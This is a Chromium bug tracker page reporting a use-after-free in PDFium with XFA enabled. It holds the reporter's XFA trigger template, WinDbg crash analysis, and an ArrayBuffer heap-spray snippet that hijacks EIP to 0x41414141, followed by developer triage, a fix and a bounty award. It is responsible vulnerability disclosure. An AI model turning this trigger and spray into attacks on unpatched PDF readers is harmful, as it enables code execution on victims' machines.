# Security: Use-After-Free in PDFium

| Field | Value |
|-------|-------|
| **Issue ID** | [40089271](https://issues.chromium.org/issues/40089271) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Internals>Plugins>PDF |
| **Platforms** | Linux, Mac, Windows, ChromeOS |
| **Reporter** | st...@gmail.com |
| **Assignee** | ts...@chromium.org |
| **Created** | 2017-10-10 |
| **Bounty** | $7,500.00 |

## Description

VULNERABILITY DETAILS

UAF can be triggered in PDFium with XFA enabled. EIP can be controlled in this case.

Using the following |template| code can cause pdfium_test.exe to crash.
```
<template xmlns="http://www.xfa.org/schema/xfa-template/2.6/">
    <subform>
        <field name="field1">
            <event activity="docReady">
                <script contentType="application/x-javascript">
                    app.alert(app.runtimeHighlight);  // <------- [*]
                </script>
            </event>
        </field>
    </subform>
</template>
```

[*] As we can see in file ``pdfium\fpdfsdk\javascript\app.h``, here the keyword ``runtimeHighlight`` can be replaced with any keyword in collection ``activeDocs, calculate, formsVersion, fs, fullscreen, language, media, platform, runtimeHighlight, viewerType, viewerVariation, viewerVersion``.

```
class CJS_App : public CJS_Object {
 public:
  explicit CJS_App(v8::Local<v8::Object> pObject) : CJS_Object(pObject) {}
  ~CJS_App() override {}

  DECLARE_JS_CLASS();

  JS_STATIC_PROP(activeDocs, app);
  JS_STATIC_PROP(calculate, app);
  JS_STATIC_PROP(formsVersion, app);
  JS_STATIC_PROP(fs, app);
  JS_STATIC_PROP(fullscreen, app);
  JS_STATIC_PROP(language, app);
  JS_STATIC_PROP(media, app);
  JS_STATIC_PROP(platform, app);
  JS_STATIC_PROP(runtimeHighlight, app);
  JS_STATIC_PROP(viewerType, app);
  JS_STATIC_PROP(viewerVariation, app);
  JS_STATIC_PROP(viewerVersion, app);

  // skipped...
};

```

The process may crash at different places when using different keywords. I listed three examples here.

[1] app.fs
----------------------------
(2bf4.1f84): Guard page violation - code 80000001 (!!! second chance !!!)
eax=d4efa537 ebx=00000008 ecx=0018e938 edx=00000000 esi=0018e938 edi=003b8841
eip=00522c4d esp=0018e890 ebp=0018e8e8 iopl=0         nv up ei ng nz na pe cy
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010287
pdfium_test!v8::internal::Isolate::current_vm_state [inlined in pdfium_test!v8::String::NewFromUtf8+0x8d]:
00522c4d 8b87780e0000    mov     eax,dword ptr [edi+0E78h] ds:002b:003b96b9=00000000

[2] app.runtimeHighlight
----------------------------
(24f0.1e2c): Access violation - code c0000005 (!!! second chance !!!)
eax=003b8891 ebx=0018ed00 ecx=0018ea68 edx=003b8891 esi=3b884181 edi=5ab49c0c
eip=0188364c esp=0018e9ec ebp=0018ea98 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010246
pdfium_test!v8::ReturnValue<v8::Value>::Set+0x3f [inlined in pdfium_test!JSPropGetter<app,&app::runtimeHighlight>+0x1fc]:
0188364c 8b00            mov     eax,dword ptr [eax]  ds:002b:003b8891=????????

[3] app.language
----------------------------
Let's analyze the details of this circumstance.

```
$$ (1) It looks like that the EIP can be controlled by us.

(18c4.fb4): Access violation - code c0000005 (!!! second chance !!!)
eax=2d000000 ebx=0018ed84 ecx=3b884181 edx=0018ea70 esi=3b884181 edi=6d5d7407
eip=0187c2fc esp=0018e9a4 ebp=0018e9e4 iopl=0         nv up ei pl nz na po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010202
pdfium_test!app::language+0x4c:
0187c2fc ff500c          call    dword ptr [eax+0Ch]  ds:002b:2d00000c=????????


$$ (2) We can figure out that |eax| stands for the virtual pointer of the first parameter of the function.

0:000> ub eip
pdfium_test!app::language+0x30 [E:\pdfium\fpdfsdk\javascript\app.cpp @ 317]:
0187c2e0 0f8509000000    jne     pdfium_test!app::language+0x3f (0187c2ef)
0187c2e6 c645ef00        mov     byte ptr [ebp-11h],0
0187c2ea e9ac000000      jmp     pdfium_test!app::language+0xeb (0187c39b)
0187c2ef 8b4508          mov     eax,dword ptr [ebp+8]      ; --> first argument of function
0187c2f2 8b08            mov     ecx,dword ptr [eax]        ; --> vptr of the object
0187c2f4 894dd0          mov     dword ptr [ebp-30h],ecx    ; --> store to stack buffer
0187c2f7 89c1            mov     ecx,eax
0187c2f9 8b45d0          mov     eax,dword ptr [ebp-30h]    ; --> load to eax


0:000> u
pdfium_test!app::language+0x4c [E:\pdfium\fpdfsdk\javascript\app.cpp @ 320]:
0187c2fc ff500c          call    dword ptr [eax+0Ch]        ; --> call virtual function


$$ (3) We can verify the above analysis.

0:000> dv
           this = 0x04f5df20
       pRuntime = 0x3b884181   ; --> object
             vp = 0x0018ea70
         sError = 0x0018ea7c
   pFormFillEnv = 0x3b884181
       language = class fxcrt::WideString


0:000> dd 0x3b884181 
3b884181  [2d000000] 003b8841 aa080000 ff001800    ; --> vptr = 2d000000
3b884191  01002003 012b3841 002b3841 1d000000
3b8841a1  252b3841 252b3841 002b3841 2d000000
3b8841b1  013b8841 94060000 ff001900 01082003
3b8841c1  012b3841 002b3841 1d000000 252b3841
3b8841d1  252b3841 002b3841 2d000000 023b8841
3b8841e1  94060000 ff001900 01082003 012b3841
3b8841f1  002b3841 1d000000 252b3841 252b3841


$$ (4) Here the memory has been freed.

0:000> !address eax+0C

Mapping file section regions...
Mapping module regions...
Mapping PEB regions...
Mapping TEB and stack regions...
Mapping heap regions...
Mapping page heap regions...
Mapping other regions...
Mapping stack trace database regions...
Mapping activation context regions...

Usage:                  Free
Base Address:           2b400000
End Address:            32c00000
Region Size:            07800000
State:                  00010000	MEM_FREE
Protect:                00000001	PAGE_NOACCESS
Type:                   <info not present at the target>


$$ (5) Source code.
bool app::language(CJS_Runtime* pRuntime,
                   CJS_PropValue& vp,
                   WideString& sError) {
  if (!vp.IsGetting())
    return false;
#ifdef PDF_ENABLE_XFA
  CPDFSDK_FormFillEnvironment* pFormFillEnv = pRuntime->GetFormFillEnv();
  if (!pFormFillEnv)
    return false;
  WideString language = pFormFillEnv->GetLanguage();            // ------> crash
  if (!language.IsEmpty()) {
    vp << language;
    return true;
  }
#endif
  vp << JS_STR_LANGUAGE;
  return true;
}
```


As analyzed above, we can control the content of the EIP register when using ``app.language`` to trigger the vulnerability. We just need to arrange some content on the freed memory block. In this case, we use the following code to achieve the goal.

```
var seedAb = new ArrayBuffer(0x2d00000);
var dv = new DataView(seedAb);
for (var i = 0; i &lt; seedAb.byteLength / 4 ; ++i) {
    dv.setUint32(i * 4, 0x41414141, true);
}
var array = new Array(0x10);
for (var i = 0; i &lt; array.length; ++i) {
    array[i] = new ArrayBuffer(seedAb.byteLength);
    new Uint8Array(array[i]).set(new Uint8Array(seedAb));
}

app.alert(app.language);
```

The attached poc ``app.language.EIP_control.pdf`` shows that the EIP can be set to 0x41414141. Just open the pdf file and wait some seconds as we need time to complete the spray process. The exception information was listed as follows.

```
(fa0.20b0): Access violation - code c0000005 (!!! second chance !!!)
eax=2d000000 ebx=0018ed7c ecx=3b884181 edx=0018ea68 esi=3b884181 edi=5f6f02a0
eip=41414141 esp=0018e998 ebp=0018e9dc iopl=0         nv up ei pl nz na po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010202
41414141 ??              ???


0:000> dd esp L1
0018e998  0187c2ff    ; --> return address


0:000> ub 0187c2ff L1
pdfium_test!app::language+0x4c [E:\pdfium\fpdfsdk\javascript\app.cpp @ 320]:
0187c2fc ff500c          call    dword ptr [eax+0Ch]


0:000> r eax
eax=2d000000


0:000> dd eax+0C
2d00000c  41414141 41414141 41414141 41414141
2d00001c  41414141 41414141 41414141 41414141
2d00002c  41414141 41414141 41414141 41414141
2d00003c  41414141 41414141 41414141 41414141
2d00004c  41414141 41414141 41414141 41414141
2d00005c  41414141 41414141 41414141 41414141
2d00006c  41414141 41414141 41414141 41414141
2d00007c  41414141 41414141 41414141 41414141


0:000> k
ChildEBP RetAddr  
WARNING: Frame IP not in any known module. Following frames may be wrong.
0018e994 0187c2ff 0x41414141
0018e9dc 018826ac pdfium_test!app::language+0x4f [E:\pdfium\fpdfsdk\javascript\app.cpp @ 320]
0018ea90 0187a8b9 pdfium_test!JSPropGetter<app,&app::language>+0xfc [E:\pdfium\fpdfsdk\javascript\JS_Define.h @ 54]
0018eac0 00bbaf18 pdfium_test!CJS_App::get_language_static+0x49 [E:\pdfium\fpdfsdk\javascript\app.h @ 178]
0018eb1c 00ca02f7 pdfium_test!v8::internal::PropertyCallbackArguments::Call+0x1e8 [E:\pdfium\v8\src\api-arguments-inl.h @ 44]
0018eb88 00c9f766 pdfium_test!v8::internal::Object::GetPropertyWithAccessor+0x1e7 [E:\pdfium\v8\src\objects.cc @ 1512]
0018ebbc 00ba3909 pdfium_test!v8::internal::Object::GetProperty+0x86 [E:\pdfium\v8\src\objects.cc @ 1055]
0018ec28 00bb2615 pdfium_test!v8::internal::LoadIC::Load+0x1a9 [E:\pdfium\v8\src\ic\ic.cc @ 577]
0018ecd4 00bb223e pdfium_test!v8::internal::__RT_impl_Runtime_LoadIC_Miss+0xf5 [E:\pdfium\v8\src\ic\ic.cc @ 2399]
0018ed48 0f38628a pdfium_test!v8::internal::Runtime_LoadIC_Miss+0xbe [E:\pdfium\v8\src\ic\ic.cc @ 2382]
0018ed6c 0e04cd09 0xf38628a
0018edd4 0ca5a3de 0xe04cd09
0018eeec 00a778b5 0xca5a3de
0018ef6c 00a7732d pdfium_test!v8::internal::`anonymous namespace'::Invoke+0x425 [E:\pdfium\v8\src\execution.cc @ 145]
0018efa0 00a7725f pdfium_test!v8::internal::`anonymous namespace'::CallInternal+0xbd [E:\pdfium\v8\src\execution.cc @ 181]
0018efc0 0051a61b pdfium_test!v8::internal::Execution::Call+0x1f [E:\pdfium\v8\src\execution.cc @ 191]
0018f058 0051aa91 pdfium_test!v8::Function::Call+0x19b [E:\pdfium\v8\src\api.cc @ 5321]
0018f088 019790c3 pdfium_test!v8::Function::Call+0x71 [E:\pdfium\v8\src\api.cc @ 5330]
0018f2e8 01d66a48 pdfium_test!CFXJSE_Context::ExecuteScript+0x743 [E:\pdfium\fxjs\cfxjse_context.cpp @ 264]
0018f3a8 01cf5b9f pdfium_test!CXFA_ScriptContext::RunScript+0x278 [E:\pdfium\xfa\fxfa\parser\cxfa_scriptcontext.cpp @ 172]
0018f4c4 01cf580b pdfium_test!CXFA_WidgetAcc::ExecuteScript+0x28f [E:\pdfium\xfa\fxfa\cxfa_widgetacc.cpp @ 631]
0018f530 01cf5664 pdfium_test!CXFA_WidgetAcc::ProcessEvent+0xeb [E:\pdfium\xfa\fxfa\cxfa_widgetacc.cpp @ 324]
0018f5bc 01cc0a02 pdfium_test!CXFA_WidgetAcc::ProcessEvent+0x114 [E:\pdfium\xfa\fxfa\cxfa_widgetacc.cpp @ 307]
0018f61c 01cbd46d pdfium_test!XFA_ProcessEvent+0x1f2 [E:\pdfium\xfa\fxfa\cxfa_ffdocview.cpp @ 428]
0018f728 01cbd555 pdfium_test!CXFA_FFDocView::ExecEventActivityByDeepFirst+0x12d [E:\pdfium\xfa\fxfa\cxfa_ffdocview.cpp @ 454]
0018f834 01cbd555 pdfium_test!CXFA_FFDocView::ExecEventActivityByDeepFirst+0x215 [E:\pdfium\xfa\fxfa\cxfa_ffdocview.cpp @ 464]
0018f940 01cbddac pdfium_test!CXFA_FFDocView::ExecEventActivityByDeepFirst+0x215 [E:\pdfium\xfa\fxfa\cxfa_ffdocview.cpp @ 464]
0018f9f0 01c9eff6 pdfium_test!CXFA_FFDocView::StopLayout+0x20c [E:\pdfium\xfa\fxfa\cxfa_ffdocview.cpp @ 131]
0018fa64 012057c7 pdfium_test!CPDFXFA_Context::LoadXFADoc+0x2a6 [E:\pdfium\fpdfsdk\fpdfxfa\cpdfxfa_context.cpp @ 134]
0018fa74 0048b894 pdfium_test!FPDF_LoadXFA+0x27 [E:\pdfium\fpdfsdk\fpdfview.cpp @ 597]
0018fcd4 00488ff0 pdfium_test!`anonymous namespace'::RenderPdf+0x594 [E:\pdfium\samples\pdfium_test.cc @ 1435]
0018ff0c 0220f26e pdfium_test!main+0x660 [E:\pdfium\samples\pdfium_test.cc @ 1630]
0018ff20 0220f0f0 pdfium_test!invoke_main+0x1e [f:\dd\vctools\crt\vcstartup\src\startup\exe_common.inl @ 64]
0018ff78 0220ef8d pdfium_test!__scrt_common_main_seh+0x150 [f:\dd\vctools\crt\vcstartup\src\startup\exe_common.inl @ 253]
0018ff80 0220f288 pdfium_test!__scrt_common_main+0xd [f:\dd\vctools\crt\vcstartup\src\startup\exe_common.inl @ 296]
0018ff88 75fa336a pdfium_test!mainCRTStartup+0x8 [f:\dd\vctools\crt\vcstartup\src\startup\exe_main.cpp @ 17]
0018ff94 77589902 kernel32!BaseThreadInitThunk+0xe
0018ffd4 775898d5 ntdll!__RtlUserThreadStart+0x70
0018ffec 00000000 ntdll!_RtlUserThreadStart+0x1b
```

VERSION
PDFium with XFA enabled
OS: Windows 7 x64
Compiler: VS 2015
Debug: Yes, with ``is_debug = true``


REPRODUCTION CASE
4 proof-of-concept files were attached.
(1) app.fs.pdf
(2) app.language.pdf
(3) app.runtimeHighlight.pdf
(4) app.language.EIP_control.pdf  (shows that EIP can be controlled)

FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION
Type of crash: [tab, browser, etc.]
Crash State: [see link above: stack trace, registers, exception record]
Client ID (if relevant): [see link above]


## Attachments

- deleted (application/octet-stream, 0 B)
- deleted (application/octet-stream, 0 B)
- deleted (application/octet-stream, 0 B)
- deleted (application/octet-stream, 0 B)

## Timeline

### el...@chromium.org (2017-10-10)

[Empty comment from Monorail migration]

[Monorail components: Internals>Plugins>PDF]

### rh...@chromium.org (2017-10-10)

[Empty comment from Monorail migration]

### wf...@chromium.org (2017-10-10)

I get

Fatal error in v8::Context::GetAlignedPointerFromEmbedderData()

when running your first PoC. Can you confirm the versions of Chrome that this repros on, and your gn flags?

### wf...@chromium.org (2017-10-10)

okay I can indeed repro this. rharrison can you take a look?

### rh...@chromium.org (2017-10-10)

Will do

### rh...@chromium.org (2017-10-17)

Sending this over to dsinclair to look at

### ds...@chromium.org (2017-10-17)

[Empty comment from Monorail migration]

### ds...@chromium.org (2017-10-18)

May I add app.runtimeHighlight.pdf to our repository as a test case?

### st...@gmail.com (2017-10-18)

Sure. No problem.

### ds...@chromium.org (2018-01-31)

So, it looks like the issue here is that in non-XFA we have a single v8::Context which we use to get the embedder data (our CFXJS_Engine). In XFA, we have many contexts which v8 stores in a stack. When we call GetCurrentContext() on the isolate there is no guarantee the one we get back will have the engine as the embedder data.

One attempt to solve this is to move the engine into the v8::Isolate data instead of the v8::Context data.

https://pdfium-review.googlesource.com/c/pdfium/+/24778

### ts...@chromium.org (2018-01-31)

Actually, I think that keeping it in the context is reasonable, its just that when CJS_App::get_language_static is "cross"-called from XFA, it need to make the correct context current.

### ds...@chromium.org (2018-01-31)

How do you know what the 'correct' context is? The one on the bottom of the stack I guess? Is there a way in V8 to access the starting context?

This will be an issue everywhere we use CJS_Runtime::CurrentRuntimeFromIsolate() as we never know what context is top of stack in XFA.

### ds...@chromium.org (2018-02-05)

tsepez@ fixed this with https://pdfium-review.googlesource.com/c/pdfium/+/25110

### sh...@chromium.org (2018-02-08)

[Empty comment from Monorail migration]

### st...@gmail.com (2018-03-07)

[Comment Deleted]

### ds...@chromium.org (2018-03-07)

[Empty comment from Monorail migration]

### st...@gmail.com (2018-04-24)

[Comment Deleted]

### aw...@google.com (2018-04-24)

Done, thanks for the ping!

### aw...@chromium.org (2018-05-04)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.
*********************************

### aw...@google.com (2018-05-04)

Nice one stackexploit! The VRP panel decided to reward $7,500 for this report.

### aw...@chromium.org (2018-05-04)

[Empty comment from Monorail migration]

### sh...@chromium.org (2018-05-15)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### is...@google.com (2018-05-15)

This issue was migrated from crbug.com/chromium/773229?no_tracker_redirect=1

[Monorail blocking: crbug.com/chromium/62400]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40089271)*
